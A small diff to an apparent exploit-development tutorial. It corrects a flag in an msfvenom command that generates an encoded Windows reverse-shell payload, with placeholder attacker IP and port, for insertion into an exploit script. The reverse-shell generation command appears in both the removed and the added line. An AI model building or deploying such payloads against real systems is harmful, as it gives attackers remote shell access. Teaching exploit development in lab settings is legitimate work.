@@ -164,6 +164,6 @@ Launch the script and enjoy popping calc!
 Now, you can craft any other shellcode as long as you respect the badchars :
 
     msfvenom -p windows/shell_reverse_tcp LHOST=<Attacker_IP> LPORT=<Attacker_Port> \
-    -f py -b '<badchars>' -e x86/shikata_ga_nai -var-name shellcode
+    -f py -b '<badchars>' -e x86/shikata_ga_nai --var-name shellcode
 
 Insert the output (python variable ``shellcode_calc``) in the script ``7_exploit.py``.
